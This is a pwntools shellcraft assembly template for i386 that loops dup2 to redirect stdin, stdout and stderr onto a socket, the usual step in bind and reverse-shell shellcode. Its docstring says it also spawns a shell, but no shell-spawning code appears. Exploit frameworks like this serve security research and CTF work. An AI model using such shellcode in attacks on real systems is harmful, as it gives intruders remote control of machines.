<% from pwnlib.shellcraft import common %>
<%page args="sock = None, os=None"/>
<%docstring>
Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell
</%docstring>
<% dup = common.label("dup") 
looplabel = common.label("loop")
%>




${dup}:
        mov ebx, ${sock}
        push 3
        pop ecx

${looplabel}:
        dec ecx
        push SYS_dup2
        pop eax
        int 0x80
        jnz ${looplabel}

